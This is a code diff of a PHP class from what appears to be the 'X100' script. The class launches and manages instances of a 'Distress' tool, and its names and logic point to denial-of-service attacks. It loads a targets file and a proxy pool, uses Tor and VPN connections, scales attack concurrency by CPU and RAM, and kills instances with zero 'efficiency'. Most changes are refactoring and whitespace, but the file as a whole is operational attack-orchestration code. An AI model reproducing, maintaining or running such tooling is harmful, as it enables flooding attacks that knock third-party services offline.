@@ -3,13 +3,12 @@
 abstract class DistressApplicationStatic extends HackApplication
 {
     public static $distressCliPath,
-                  $localTargetsFilePath,
-                  $proxyPoolFilePath,
-                  $configFilePath,
-                  $useLocalTargetsFile,
-                  $localTargetsFileHasChanged = false,
-                  $localTargetsFileLastChangeAt = 0,
-                  $currentAffinityCoreId;
+        $targetsFilePath,
+        $proxyPoolFilePath,
+        $configFilePath,
+        $localTargetsFileHasChanged = false,
+        $localTargetsFileLastChangeAt = 0,
+        $currentAffinityCoreId;
 
     public static function constructStatic()
     {
@@ -24,23 +23,22 @@ abstract class DistressApplicationStatic extends HackApplication
             return;
         }
 
-        static::$distressCliPath  = __DIR__ . '/app';
-        static::$localTargetsFilePath = $TEMP_DIR . '/distress-targets.bin';
+        static::$distressCliPath = __DIR__ . '/app';
+        static::$targetsFilePath = $TEMP_DIR . '/distress-targets.bin';
         static::$proxyPoolFilePath = $TEMP_DIR . '/distress-proxies.bin';
         static::$configFilePath = $TEMP_DIR . '/distress-config.bin';
-        static::$useLocalTargetsFile = false;
 
-        Actions::addFilter('RegisterHackApplicationClasses',  [static::class, 'filterRegisterHackApplicationClasses'], 11);
-        Actions::addFilter('InitSessionResourcesCorrection',  [static::class, 'filterInitSessionResourcesCorrection']);
-        Actions::addAction('BeforeInitSession',               [static::class, 'actionBeforeInitSession']);
-        Actions::addAction('AfterInitSession',                [static::class, 'setCapabilities'], 100);
-        Actions::addAction('BeforeMainOutputLoop',            [static::class, 'actionBeforeMainOutputLoop']);
+        Actions::addFilter('RegisterHackApplicationClasses', [static::class, 'filterRegisterHackApplicationClasses'], 11);
+        Actions::addFilter('InitSessionResourcesCorrection', [static::class, 'filterInitSessionResourcesCorrection']);
+        Actions::addAction('BeforeInitSession', [static::class, 'actionBeforeInitSession']);
+        Actions::addAction('AfterInitSession', [static::class, 'setCapabilities'], 100);
+        Actions::addAction('BeforeMainOutputLoop', [static::class, 'actionBeforeMainOutputLoop']);
 
-        Actions::addAction('BeforeTerminateSession',          [static::class, 'terminateInstances']);
-        Actions::addAction('BeforeTerminateFinalSession',     [static::class, 'terminateInstances']);
-        Actions::addAction('TerminateSession',                [static::class, 'killInstances']);
-        Actions::addAction('TerminateFinalSession',           [static::class, 'killInstances']);
-        Actions::addFilter('KillZombieProcesses',             [static::class, 'filterKillZombieProcesses']);
+        Actions::addAction('BeforeTerminateSession', [static::class, 'terminateInstances']);
+        Actions::addAction('BeforeTerminateFinalSession', [static::class, 'terminateInstances']);
+        Actions::addAction('TerminateSession', [static::class, 'killInstances']);
+        Actions::addAction('TerminateFinalSession', [static::class, 'killInstances']);
+        Actions::addFilter('KillZombieProcesses', [static::class, 'filterKillZombieProcesses']);
 
         require_once __DIR__ . '/DistressAutoUpdater.php';
     }
@@ -56,63 +54,37 @@ abstract class DistressApplicationStatic extends HackApplication
         global $SESSIONS_COUNT, $DISTRESS_USE_PROXY_POOL, $NEW_DIR_ACCESS_MODE;
 
         MainLog::log('');
-        static::$localTargetsFileHasChanged = false;
         static::$currentAffinityCoreId = -1;
 
-        if (
-                $SESSIONS_COUNT === 1
-            ||  $SESSIONS_COUNT % 5 === 0
-            ||  !file_exists(static::$localTargetsFilePath)
-        ) {
-            $result = DistressGetTargetsFile::getDistressTargetsFile(static::$localTargetsFilePath);
-            static::$useLocalTargetsFile = $result->success;
-            if (static::$useLocalTargetsFile) {
-                static::$localTargetsFileHasChanged = $result->changed;
-                static::$localTargetsFileLastChangeAt = $result->changedAt;
-            } else {
-                MainLog::log('Failed to download config file for Distress', 1, 1);
-            }
-        }
-
         // ---
-        
-        if (static::$useLocalTargetsFile) {
+
+        if (file_exists(static::$targetsFilePath)) {
             $targetsFileChangeMessage = '';
+
             if (static::$localTargetsFileLastChangeAt) {
                 $targetsFileChangeMessage = 'Last Distress targets file change was at ' . date('Y-m-d H:i:s', static::$localTargetsFileLastChangeAt);
             } else if ($SESSIONS_COUNT !== 1) {
                 $targetsFileChangeMessage = "The Distress targets file hasn't changed after X100 script was launched";
             }
+
             $targetsFileChangeMessage = Actions::doFilter('TargetsFileChangeMessage', $targetsFileChangeMessage);
             MainLog::log($targetsFileChangeMessage);
+        } else {
+            MainLog::log('Failed to load targets file for Distress', 1, 1);
         }
 
         // ---
 
-        if (    $SESSIONS_COUNT === 1
-            ||  $SESSIONS_COUNT % 5 === 0
-            ||  !file_exists(static::$configFilePath)
-        ) {
-            $success = DistressGetConfig::fetchDistressConfig(static::$configFilePath, 'config');
-            if (!$success) {
-                MainLog::log('Failed to load Distress Config file');
-            }
+        if (!file_exists(static::$configFilePath)) {
+            MainLog::log('Failed to load Distress Config file', 1, 1);
         }
 
         // ---
 
         if (
-            $DISTRESS_USE_PROXY_POOL
-            && (
-                    $SESSIONS_COUNT === 1
-                ||  $SESSIONS_COUNT % 5 === 0
-                ||  !file_exists(static::$proxyPoolFilePath)
-            )
+            $DISTRESS_USE_PROXY_POOL && !file_exists(static::$proxyPoolFilePath)
         ) {
-            $success = DistressGetConfig::fetchDistressConfig(static::$proxyPoolFilePath, 'proxies');
-            if (!$success) {
-                MainLog::log('Failed to load Distress Proxy Pool file');
-            }
+            MainLog::log('Failed to load Distress Proxy Pool file', 1, 1);
         }
 
         // ---
@@ -122,14 +94,14 @@ abstract class DistressApplicationStatic extends HackApplication
             rmdirRecursive($distressTmpDir);
         }
 
-        mkdir($distressTmpDir,  $NEW_DIR_ACCESS_MODE);
+        mkdir($distressTmpDir, $NEW_DIR_ACCESS_MODE);
         chown($distressTmpDir, 'app-h');
         chgrp($distressTmpDir, 'app-h');
 
         // ---
 
         $distressTmpTorDir = $distressTmpDir . '/tor';
-        mkdir($distressTmpTorDir,  $NEW_DIR_ACCESS_MODE);
+        mkdir($distressTmpTorDir, $NEW_DIR_ACCESS_MODE);
         chown($distressTmpTorDir, 'app-h');
         chgrp($distressTmpTorDir, 'app-h');
     }
@@ -152,8 +124,8 @@ abstract class DistressApplicationStatic extends HackApplication
 
         $usageValuesCopy = $usageValues;
         unset($usageValuesCopy['systemAverageTmpUsage']);
-        unset($usageValuesCopy['systemPeakTmpUsage']);        
-        
+        unset($usageValuesCopy['systemPeakTmpUsage']);
+
         MainLog::log('Distress    average  CPU   usage during previous session was ' . padPercent($usageValuesCopy['distressProcessesAverageCpuUsage']['current']));
         MainLog::log('Distress    average  RAM   usage during previous session was ' . padPercent($usageValuesCopy['distressProcessesAverageMemUsage']['current']), 2);
 
@@ -163,8 +135,8 @@ abstract class DistressApplicationStatic extends HackApplication
         $resourcesCorrectionRule = ResourcesConsumption::reCalculateScale($usageValuesCopy, $DISTRESS_SCALE, $DISTRESS_SCALE_INITIAL, $DISTRESS_SCALE_MIN, $DISTRESS_SCALE_MAX);
         $newScale = intRound(val($resourcesCorrectionRule, 'newScale'));
 
-        if ($newScale  &&  $newScale !== $DISTRESS_SCALE) {
-            MainLog::log($newScale > $DISTRESS_SCALE   ?  'Increasing' : 'Decreasing', 0);
+        if ($newScale && $newScale !== $DISTRESS_SCALE) {
+            MainLog::log($newScale > $DISTRESS_SCALE ? 'Increasing' : 'Decreasing', 0);
             MainLog::log(" Distress scale value from $DISTRESS_SCALE to $newScale because of the rule \"" . $resourcesCorrectionRule['name'] . '"');
         }
 
@@ -174,10 +146,10 @@ abstract class DistressApplicationStatic extends HackApplication
 
         beforeReturn:
 
-        $scaleValueMessage  = ($SESSIONS_COUNT === 1  ?  'Initial ': '');
+        $scaleValueMessage = ($SESSIONS_COUNT === 1 ? 'Initial ' : '');
         $scaleValueMessage .= "Distress scale value (concurrency) $DISTRESS_SCALE";
         $scaleValueMessage = Actions::doFilter('ScaleValueMessage', $scaleValueMessage);
-        MainLog::log($scaleValueMessage. ", range $DISTRESS_SCALE_MIN-$DISTRESS_SCALE_MAX");
+        MainLog::log($scaleValueMessage . ", range $DISTRESS_SCALE_MIN-$DISTRESS_SCALE_MAX");
 
         return $usageValues;
     }
@@ -189,18 +161,18 @@ abstract class DistressApplicationStatic extends HackApplication
         foreach (static::getRunningInstances() as $distressApplication) {
             $efficiencyLevel = $distressApplication->getEfficiencyLevel();
             if (
-                    $efficiencyLevel === 0
-                &&  $MAIN_OUTPUT_LOOP_ITERATIONS_COUNT > 1
+                $efficiencyLevel === 0
+                && $MAIN_OUTPUT_LOOP_ITERATIONS_COUNT > 1
             ) {
                 $distressApplication->requireTerminate('Zero efficiency');
             }
         }
     }
 
-    public static function countPossibleInstances() : int
+    public static function countPossibleInstances(): int
     {
         global $DISTRESS_CPU_AND_RAM_LIMIT;
-        return intval($DISTRESS_CPU_AND_RAM_LIMIT)  ?  1000000 : 0;
+        return intval($DISTRESS_CPU_AND_RAM_LIMIT) ? 1000000 : 0;
     }
 
     public static function getNewInstance($vpnConnection)
@@ -247,5 +219,5 @@ abstract class DistressApplicationStatic extends HackApplication
             return $internalPath;
         }
     }
-    
+
 }
